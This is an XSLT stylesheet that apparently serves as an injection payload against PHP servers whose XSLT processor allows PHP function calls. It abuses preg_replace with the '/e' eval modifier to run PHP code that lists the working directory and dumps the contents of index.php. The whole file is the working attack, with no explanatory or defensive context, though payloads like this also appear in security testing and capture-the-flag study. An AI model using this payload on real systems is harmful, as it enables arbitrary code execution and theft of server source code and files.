<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<xsl:variable name="scana">
        implode('<br/>',scandir('.'))
</xsl:variable>

<xsl:variable name="read">
        readfile('index.php')
</xsl:variable>
<br/>--------<br/>
<br />Scan dir 1: <xsl:value-of select="php:function('preg_replace', '/.*/e', $scana, '')" />
<br/>--------<br/>
<br />Read File: <xsl:value-of select="php:function('preg_replace', '/.*/e', $read, '')" />
<br/>--------<br/>
</body>
</html>
